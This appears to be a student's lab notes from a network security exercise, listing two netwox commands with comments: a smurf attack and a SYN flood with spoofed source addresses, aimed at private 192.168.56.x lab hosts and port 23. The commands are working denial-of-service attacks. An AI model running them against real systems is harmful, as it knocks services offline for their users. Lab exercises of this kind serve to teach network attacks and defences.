#smurf attack (single machine)
#packet reached machine and machine ponged the victim

sudo netwox 66 -i 192.168.56.101 -E 08:00:27:86:a4:e5 -I 192.168.56.103 -d Eth1

#SYN flood attack
#sent a bajillion TCP SYN requests to 192.168.56.103 from spoofed addresses

sudo netwox 76 -i 192.168.56.103 -p 23
